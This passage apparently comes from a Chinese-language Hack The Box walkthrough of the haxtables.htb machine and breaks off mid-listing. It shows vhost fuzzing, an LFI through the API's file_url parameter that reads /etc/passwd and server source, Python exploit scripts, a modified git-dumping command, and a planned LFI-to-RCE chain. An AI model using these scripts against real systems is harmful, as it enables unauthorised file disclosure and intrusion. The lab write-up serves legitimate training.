class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\thaxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h3 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h3><p>枚举VHOST</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;http://haxtables.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.haxtables.htb&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                             </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000000051:   200        0 L      0 W        0 Ch        &quot;api&quot;                                               </span><br><span class="line">000000177:   403        9 L      28 W       284 Ch      &quot;image&quot;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\tapi.haxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\timage.haxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>页面给出的API调用方法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;str2hex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;http://example.com/data.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>参数<code>file_url</code>可能存在LFI漏洞</p><p>利用API进行LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://api.haxtables.htb/v3/tools/string/index.php --json <span class="string">&#x27;&#123;&quot;action&quot;:&quot;b64encode&quot;,&quot;file_url&quot;:&quot;file:///etc/passwd&quot;&#125;&#x27;</span> | jq -r .data | base64 -d</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:105:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:106:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:107:113::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:108:114::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:109:115::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:111:117::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">svc:x:1000:1000:svc:&#x2F;home&#x2F;svc:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:999:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>编写如下<code>lfi.py</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;file://%s&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = req.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">data = json.loads(res.text)</span><br><span class="line">print(b64decode(data[<span class="string">&quot;data&quot;</span>]).decode())</span><br></pre></td></tr></table></figure><p>读取apache2站点配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lfi.py /etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName haxtables.htb</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName api.haxtables.htb</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;api</span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName image.haxtables.htb</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        </span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;image</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line">    #SecRuleEngine On</span><br><span class="line"></span><br><span class="line">    &lt;LocationMatch &#x2F;&gt;</span><br><span class="line">        SecAction initcol:ip&#x3D;%&#123;REMOTE_ADDR&#125;,pass,nolog,id:&#39;200001&#39;</span><br><span class="line">        SecAction &quot;phase:5,deprecatevar:ip.somepathcounter&#x3D;1&#x2F;1,pass,nolog,id:&#39;200002&#39;&quot;</span><br><span class="line">        SecRule IP:SOMEPATHCOUNTER &quot;@gt 5&quot; &quot;phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:&#39;200003&#39;&quot;</span><br><span class="line">        SecAction &quot;phase:2,pass,setvar:ip.somepathcounter&#x3D;+1,nolog,id:&#39;200004&#39;&quot;</span><br><span class="line">        Header always set Retry-After &quot;10&quot; env&#x3D;RATELIMITED</span><br><span class="line">    &lt;&#x2F;LocationMatch&gt;</span><br><span class="line"></span><br><span class="line">    ErrorDocument 429 &quot;Rate Limit Exceeded&quot;</span><br><span class="line"></span><br><span class="line">        &lt;Directory &#x2F;var&#x2F;www&#x2F;image&gt;</span><br><span class="line">                Deny from all</span><br><span class="line">                Allow from 127.0.0.1</span><br><span class="line">                Options Indexes FollowSymLinks</span><br><span class="line">                AllowOverride All</span><br><span class="line">                Require all granted</span><br><span class="line">        &lt;&#x2F;DIrectory&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax&#x3D;apache ts&#x3D;4 sw&#x3D;4 sts&#x3D;4 sr noet</span><br></pre></td></tr></table></figure><p>站点<code>image.haxtables.htb</code>仅允许本地访问</p><p>读取<code>image.haxtables.htb/index.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lfi.py /var/www/image/index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/coming_soon.html&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读取<code>image.haxtables.htb/utils.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/utils.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        http_response_code(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (gethostbyname(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_status</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;z</span><br><span class="line">    <span class="variable">$status</span> = shell_exec(<span class="string">&#x27;cd /var/www/image &amp;&amp; /usr/bin/git status&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$status</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_log</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = shell_exec(<span class="string">&#x27;cd /var/www/image &amp;&amp; /ust/bin/git log --oneline &quot;&#x27;</span> . addslashes(<span class="variable">$file</span>) . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$log</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$commit</span> = shell_exec(<span class="string">&#x27;sudo -u svc /var/www/image/scripts/git-commit.sh&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$commit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>该路径疑似存在git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/.git/HEAD</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ref: refs&#x2F;heads&#x2F;master</span><br></pre></td></tr></table></figure><p>确认存在git</p><p>获取<code>GitTools</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/internetwache/GitTools</span><br></pre></td></tr></table></figure><p><code>./GitTools/Dumper/gitdumper.sh</code>的curl语句替换为如下语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://api.haxtables.htb/v3/tools/string/index.php&quot;</span> --json <span class="string">&quot;&#123;\&quot;action\&quot;:\&quot;b64encode\&quot;, \&quot;file_url\&quot;:\&quot;file:///var/www/image/.git/<span class="variable">$objname</span>\&quot;&#125;&quot;</span> | jq -r .data  | base64 -d &gt; <span class="string">&quot;<span class="variable">$target</span>&quot;</span></span><br></pre></td></tr></table></figure><p>获取项目文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash ./Dumper/gitdumper.sh http://images.haxtables.htb/.git/ /tmp/image/</span><br><span class="line">bash ./Extractor/extractor.sh /tmp/image/ /tmp/dump/</span><br></pre></td></tr></table></figure><p>得到<code>/action/action_header.php</code>内容</p><p>确认内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/actions/action_handler.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;No page specified!&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在可以进行LFI漏洞，请求<code>http://image.haxtables.htb/actions/action_handler.php?page=PAYLOAD</code>进行LFI_TO_RCE</p><p>确认<code>/etc/hosts</code>信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /etc/hosts</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 encoding</span><br><span class="line">127.0.0.1 haxtables.htb api.haxtables.htb image.haxtables.htb</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure><p>存在<code>image.haxtables.htb</code>的解析记录</p><p>编写<code>exp.py</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;http://image.haxtables.htb/actions/action_handler.php?page=%s&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line">res = req.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>进行LFI测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py file:///etc/passwd</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;Unacceptable URL&quot;&#125;</span><br></pre></td></tr></table></figure><p>查看<code>api.haxtables.htb/v3/tools/string/index.php</code>的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/api/v3/tools/string/index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 